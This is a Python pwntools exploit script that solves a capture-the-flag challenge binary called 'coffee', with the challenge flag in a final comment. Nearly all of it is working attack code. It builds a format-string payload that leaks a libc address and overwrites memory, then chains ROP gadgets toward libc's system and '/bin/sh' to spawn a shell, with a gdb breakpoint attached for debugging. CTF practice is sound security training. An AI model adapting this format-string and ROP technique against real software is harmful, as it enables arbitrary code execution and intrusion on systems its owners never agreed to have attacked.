from pwn import *

BIN = "./coffee"
elf = ELF(BIN)
libc = ELF("libc.so.6")

leak = '%29$llx'
leak_offset = 0x270b3
system_offset = 0x55410
bin_sh_offset = 0x1b75aa

writeable = 0x404008
scanf_plt = 0x4010a0
print(hex(scanf_plt))
pop_rsi_r15 = 0x401291
pop_rdi = 0x401293
ret = 0x40101a
pop_6 = 0x40128a
x_value = 0xc0ffee
x_address = 0x404048
puts_got = elf.got['puts']
print(hex(puts_got))

main = elf.symbols['main'] #0x401196
print(hex(main))




def exploit():
	payload = b'%020$n' + b'%29$llxA' + b'%4733x' + b'%19$hn' + b'%24731x' + b'%020$n' + b'\x00'
	payload += p64(pop_rdi) + p64(writeable) + p64(pop_rsi_r15) + p64(x_address) + p64(0) + p64(scanf_plt) + p64(ret) + p64(main)
	payload += p64(puts_got) + p64(writeable)
	_breakpoint="""
		b*main+52
		"""
	gdb.attach(io,_breakpoint)
	io.sendline(payload)

	
io = process(BIN)
context.log_level="debug"
exploit()

#TSGCTF{Uhouho_gori_gori_pwn}